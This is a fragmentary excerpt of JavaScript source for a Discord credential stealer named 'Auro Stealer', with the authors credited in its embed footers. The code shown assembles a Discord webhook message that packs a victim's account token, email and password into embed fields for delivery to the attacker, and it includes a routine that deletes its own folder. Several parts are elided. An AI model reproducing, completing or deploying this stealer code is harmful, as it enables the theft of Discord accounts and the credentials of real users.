...
function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Auro Stealer"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Auro Stealer"));
...
function Login(email, password, token) {
    ...
    xmlHttp.responseText;`, !0).then((info) => {
        ...
        var params = {
            username: "AuroStealer",
            content: "",
            avatar_url: "https://images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp",
            embeds: [
                {
                    "color": 16507654,
                    "fields": [
                        {
                            "name": "<a:bby:960853522545508383> Token",
                            "value": ```${token}```,
                            "inline": true
                        },
                        {
                            "name": "<:CH_IconGreyPin:734308146990022676> Information",
                            "value": ```Email : ${email}\nPassword : ${password}```,
                            "inline": false
                        }
                    ],
                    "author": {
                        ...
                        "icon_url": "https://images-ext-1.discordapp.net/external/qQjwcf0ZGGS7o4VhQSRgFYBYkCBGZLzkYoQrExQ2Wrg/https/media.discordapp.net/attachments/959484113373507599/963513865398784120/8e663c3910ed89cf21a75c4cd7874817.webp"
                    },
                    "footer": {
                        "text": "AuroStealer V1 Made by Thanosa & ItzKr$zz"
                    }
                }
            ]
        }
            ...
            embeds: [
                {
                    ...
                    "footer": {
                        "text": "Auro Stealer by Thanosa & ItzKr$zz"
                    }
                }
            ]
        }
